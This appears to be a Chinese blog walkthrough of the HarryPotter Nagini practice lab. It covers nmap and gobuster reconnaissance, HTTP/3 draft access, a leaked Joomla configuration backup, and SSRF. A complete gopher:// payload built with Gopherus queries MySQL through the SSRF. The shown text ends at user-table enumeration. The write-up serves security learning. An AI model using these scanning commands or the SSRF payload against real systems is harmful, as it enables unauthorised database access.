---
title: 从http3协议利用到ssrf服务端请求伪造，从joomla后台反弹shell到suid提权--靶机练习之HarryPotter_Nagini
url: https://mp.weixin.qq.com/s/mRZGf9ZGrZUW47ywpO1I-g
source: Doonsec's feed
date: 2026-10-16
fetch_date: 2026-10-17T06:32:44.024190
---

# 从http3协议利用到ssrf服务端请求伪造，从joomla后台反弹shell到suid提权--靶机练习之HarryPotter_Nagini

# 从http3协议利用到ssrf服务端请求伪造，从joomla后台反弹shell到suid提权--靶机练习之HarryPotter\_Nagini

原创

wonderful
wonderful

百炼G33K

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

## 信息搜集

### 端口探测

```
nmap -sn 192.168.8.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WWjQAicOBd8UuK51jATHWY8J1EM3bHTAwn0S7jAj7gdWB6tsqVjeRlGXDPqsU248g9OxjEF98HqGBYxqhxOhSftrXqLAWWk9kibQ/640?wx_fmt=png&from=appmsg)

```
nmap -sT --min-rate 10000 192.168.8.16 -p-
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WXsl8oySIiapNEEVHUukZbcREvBT03zg2gUuSU30539Y0h4o5MiadN90v9sZe1GMBrdTx7OhNPspDfPcVJAC5VUHkWm3oTE88icico/640?wx_fmt=png&from=appmsg)
> 只开了两个端口22，80

```
nmap -sT -sC -sV -O 192.168.8.16 -p22,80
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WXG5Qmx8iaLCZ39ibke7ibGXrWgMkxn6vd6mwXFBoXhBWYIVsu9cljEDEspzet2bacbdqm3Mcvqa7KQtg9XIqHbwHjxltdl2oovLE/640?wx_fmt=png&from=appmsg)
> debian系统、apache服务

![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WV1Joo51szMsf6LOvjtDCyibVwcX4LjftuZOwpIicpNibcVFSlvUVGhL4tBXKhX3W5iaU2qKaQX68ACycj5h5Swjo9ZNzLPuj33Wm4/640?wx_fmt=png&from=appmsg)

### 目录扫描

```
dirb http://192.168.8.16/
```

![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WUtq7tcbfEy25931QpaDu23ROyOrrheCJYrvR3jH3ibZsT9w16EJHIbRHUFm78k4cKZwbkardI71QY0z9Lcfgku5MyUgxoicMzuE/640?wx_fmt=png&from=appmsg)
> 发现是joomlaCMS框架

```
gobuster dir -u http://192.168.8.16/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,bak
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WVLNNcn2dr0A45qFsiaNERFAicpVI8sozEg3gdMnnJwIhDDh7pggqa6SrWFod16dEsD0CZp1gxld2fjevpNopvoeSsTia0vQdtHNc/640?wx_fmt=png&from=appmsg)
> 继续深度扫描了一下泄露的文件，有个note.txt

![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WUap2BuK29vzdnnEpvKKQ9XqKVYwN2tG1CQxNDkKw06jlM0JwUaj8UHtJ9uBdk4jUFdrKEv3KNKibmdzZPEZCGOX7ywVDv4mNRk/640?wx_fmt=png&from=appmsg)
> 提示了一个http3的url地址和一个网站管理员site\_admin

### http3配置

> http3需要使用quiche进行连接，使用quiche我们需要先安装下rust

> 安装rust环境,一键默认就行

```
curl https://sh.rustup.rs -sSf | sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WXfDRmGJ9eGhvTYjX4FGbcfuUHzQwibia3w5Ivo3Mc0JZUIibTJnlgqVgRXqyWbtJKhCYwIAle6FOic2r0fwha3y9sBgogjzcsZ7aM/640?wx_fmt=png&from=appmsg)
> 下载安装quiche

![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WWVH1DWUzFbwKf0cIwfn2YcjmM8yd0m1xNJvibejFnloHpiadhCg4C2gvu94DY8f1Eond2ChUqwiayRUR0EB3gw2g9EicfvfpyhDSM/640?wx_fmt=png&from=appmsg)

```
git clone https://github.com/cloudflare/quiche.git
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WWCPqDbzQSTpsXWFCican3F1PD6sH0CULzBgWtGvwBX4GJyRTbnjZePIMgasIWKWnDMwvr1Dnia6JsuBWTq9GZpqibFFEV81v5Xvo/640?wx_fmt=png&from=appmsg)
> 构建项目(初次安装rust需要重启一下终端才能加载相关命令的环境变量)

```
cargo build --examples
```

```
cargo test
```

> 环境搭建好后进入quiche/target/debug/examples目录，然后利用http3进行访问

```
./http3-client https://quic.nginx.org/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WUA6ib9XVibHRu6svn6TWRXbprtNnicOe0h2EdibnjQcPcS4iaqAtnLKagN1YdIpictibY10BQTRUwwGhicYCNr6wLWsHmRaCHqbRnMib0w/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WUHFowCjjahlSEYUWtEqWPV7komp4IFFdRA4YFukZ15GNpJia0gpUqjFUgjYZsJgLdZtvzDDjRXdDBeHVRoGyFUkNjneL56tnBg/640?wx_fmt=png&from=appmsg)
> 测试网站正常能够http3访问，靶机的地址无回显

> PS:这里有一个坑，靶机的http3版本协议很老，新的连接不上 这边先抓包看一下靶机的http3版本

```
tcpdump -i eth0 -X 'udp and host 192.168.8.16 and port 443' & curl -sk --http3-only https://quic.nagini.hogwarts/
```

![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WUCJCPmgxC4D8ILpwib8Uw02AlicSIPWV5ia7Udy4V3nmjnBymVEBXhTvmt4tJiaL8SpQgAENRq2QRowCy640DQNds511QsVxKyPh4/640?wx_fmt=png&from=appmsg)
> 每个回包的结尾都是有特征的，这也泄露了其支持的版本号 0xff0000xx 前缀是 IETF QUIC draft 版的专属编码,规则是 0xff000000 + draft号:

```
ff 0000 1d------>29
ff 0000 1c------>28
ff 0000 1b------>27
```

> 支持的版本最新到draft29,搜索历史版本，查找支持协议的安装包

```
curl -s https://raw.githubusercontent.com/aiortc/aioquic/0.9.21/src/aioquic/h3/connection.py |grep H3_ALPN
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WWjfl9gQYT3RP8sA4mtdjjLmkaeZaJ6ZMADE20RibXcxia5rs2hZzw6ichBwYgic05lcH33C2ZqIbhM1V1988qtBKZWn2w3HnRzJuo/640?wx_fmt=png&from=appmsg)
> 创建python虚拟环境

```
python3 -m venv ./h3draft-venv
./h3draft-venv/bin/pip install "aioquic==0.9.21" wsproto
```

> http3连接,读取隐藏内容

```
./h3draft-venv/bin/python http3_client.py --insecure --output-dir ./ https://quic.nagini.hogwarts
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WVbtzhGlYzV2HlcDuHuooFxSr0wroM4qNmExuPTxpLLuiaFG9uKbXSHlqr2vOefQ6LVFlqNibxjAOvJkNEW1Q6VsMte16aHUHNKA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WXusZG89hH21ctBl2F51JibrIcwhN2qhsY1uvPtyfibXx1OAXQTZ9aL9eGZlMFpl8ialn0tQ5XaJlaRF03zuMibIHzTic0DhYibRU8E4/640?wx_fmt=png&from=appmsg)
> 提示有一个隐藏的目录,和一个备份文件

## 备份文件扫描

![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WWynvZo8nCiaxy3oTCOEva58JuMqUyMrvxndG1KiaUUvLBLSpBfLpXKCDuxS3ibLdQ1JQ9I4yQNic0wFcdY8icUBgCkBBa1nJDweF3c/640?wx_fmt=png&from=appmsg)
> 之前提示有一个bak结尾的configuration的备份文件，这个系统是php的搭建的我们也加上.php.bak

```
gobuster dir -u http://192.168.8.16/joomla/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x bak,php.bak
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WWhicic1XEYzCEolFzpCicY49o0lh3XyxE2rX7r67onwCUBGJxoshRovYK9G5XyS9FsqOGJ5MMMq91EuXX5ldUKbiaApehIc6p0Tlo/640?wx_fmt=png&from=appmsg)

```
wget http://192.168.8.16/joomla/configuration.php.bak
```

![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WWsrpiazYeCYHF21OyxFrDdiaCdvIs8yRQ4djQib9bhUYy26VAX2xYwC5koCTPfkz3MBnNB8GIWA7tm2QPhjjaxLwD8yothpNVZtc/640?wx_fmt=png&from=appmsg)
> 数据库用户名为goblin,密码为空；同事还拿到了一个密钥 =======

## joomla备份文件泄露

> joomla架构，正好对应着配置文件的备份文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WXdWl0cQufvFZCKG3sYbHHmUJibvriahS4xUvVDItgGQsxXnkrEBFl6yPqFyq1tia0zTfhSuZBvaAWuc8cvVgcQSXehzTII35ZZg8/640?wx_fmt=png&from=appmsg)
> 数据库密码为空

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WWkMEqscicKD5NuzT1TdH0icLghgXbiaAxsKsibfbCSQWo5ybnECSrRN6AJNKs5ic35icD0VBQ7aKlR2drybUr9I0iamFJ9n7y38jx548/640?wx_fmt=png&from=appmsg)

## ssrf服务端请求伪造利用

### 探测

> 另外一个是隐藏目录，功能是测试内网页面资源的

![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WW373nAWDjEYyoXvFroG8Ixichvp6c4AW5PicKMbKTTlZAvA5lPSFBiba1SfIA8CRD7EbEdDCldUteVJic03ynmUOACd7YAyOWEX1k/640?wx_fmt=png&from=appmsg)
> 传入127.0.0.1，发现回显了首页的页面

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WUept78Gib5WMf1zicaFcicX8ZWwzFwZAEn4QL3MTtbREZCPibu86nr9pxr1uzvmicWG72lrPL49ko0pToSV462cbD0icqZfOvuU53ZY/640?wx_fmt=png&from=appmsg)
> 传入file协议，能够读取文件，说明存在服务端请求伪造漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WW6JxxMQRwJ0ibv9AINKYcFeMqQj8TiaPplR3OmTibcnBJsgichrknuge2PJBrMkWQdxTuDibkXMFNNMJVezeI28L7AE6bWfjxwhuf0/640?wx_fmt=png&from=appmsg)

### 利用gopher协议攻击mysql

> 根据上面获取的信息，靶机上存在一个数据库服务，数据库类型是mysql

```
python2 gopherus.py --exploit mysql
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WUypb0sUiaiapGklEtAgFicia7l0dz1sfiaEusQGGmoFevNniaHsHpYZ1DrBAab3FbMZcovWvAqwugTrRKdDgicur2LrUAiaqg4Yo0xv1U/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WX1dOFfcDYbKFfmYGRqQBslu0zSbvQt102jWdZaxibNeBFBgicYO3LWBriaay1SdVAJ3mwJXtYjEHKvByB6sw3mEjOvGicjLkWpeaY/640?wx_fmt=png&from=appmsg)
> 需要把payload写成一句话

```
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%17%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%73%68%6f%77%20%74%61%62%6c%65%73%01%00%00%00%01
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WVNpkIAlNutw2lWWAGAyyoCReLZa9OL3XtJWERFQkk8pPpIFlUs5QHwb0Ksricgk3f9we6H3cG0FZRIqUNCB1IoDkSppq6yyKvA/640?wx_fmt=png&from=appmsg)
> 找到用户表

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WVb65KXVqBQic6OxnLGdrwVdCeJ9FBZQPjFImJuK5ERxS0XsqQ8XG2fTYw5yiaABoD4mAdiaORticrrZOIQPz7yoLZqbNLFvq5Rp2g/640?wx_fmt=png&from=appmsg)
> 确定字段，user...